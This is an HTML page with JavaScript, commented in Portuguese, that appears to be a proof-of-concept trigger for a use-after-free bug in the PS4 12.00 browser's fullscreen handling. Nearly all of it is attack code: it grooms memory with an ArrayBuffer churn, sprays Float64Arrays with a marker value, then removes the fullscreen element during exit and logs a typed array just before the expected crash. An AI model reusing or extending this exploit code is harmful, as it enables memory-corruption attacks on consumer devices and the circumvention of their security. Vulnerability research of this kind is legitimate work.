<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Fullscreen UAF (Teste 4 ISOLADO)</title>
</head>
<body>

<h2>PS4 12.00 - Fullscreen UAF (Teste 4 - 100% Crash)</h2>
<button onclick="runTest()">Run Test</button>

<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>

<script>
const PATTERN = 2.121995791e-314;

function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

function runTest() {

    log("[*] Iniciando teste...");
    
    let arr = new Float64Array(8);
    arr[0] = 13.37;

    log("[+] Objeto criado");

    // Elemento alvo (CRÍTICO)
    let fsTarget = document.createElement("div");
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    document.body.appendChild(fsTarget);

    // Eventos importantes (não alteram timing)
    document.addEventListener("fullscreenchange", () => {
        log("[EVENT] fullscreenchange");
    });

    document.addEventListener("visibilitychange", () => {
        log("[EVENT] visibility: " + document.visibilityState);
    });

    // Entrar em fullscreen
    fsTarget.webkitRequestFullscreen?.();

    // PONTO CRÍTICO — esperar interação do usuário
    window.onblur = function() {

        window.onblur = null;

        log("[*] onblur recebido (OPTIONS detectado)");

        // 🔥 GC LEVE (não agressivo pra não quebrar timing)
        for (let i = 0; i < 2000; i++) {
            new ArrayBuffer(0x1000);
        }

        log("[*] GC leve executado");

        // 🔥 Spray leve
        let spray = [];
        for (let i = 0; i < 2000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        log("[*] Spray leve executado");

        // ⏱️ DELAY CRÍTICO — mantém janela do bug
        setTimeout(() => {

            log("[*] Trigger UAF (remove + exitFullscreen)");

            // 🔥 ESSÊNCIA DO BUG
            fsTarget.remove();
            document.webkitExitFullscreen?.();

            // Pequena observação antes do crash
            setTimeout(() => {
                try {
                    log("---- CHECK PRÉ-CRASH ----");
                    log("[F64] " + arr[0]);
                    log("[META] len=" + arr.length + " byteLength=" + arr.byteLength);
                } catch(e) {
                    log("[ERRO] " + e);
                }
            }, 50);

        }, 500); // ⚠️ ESSENCIAL

    };
}
</script>

</body>
</html>
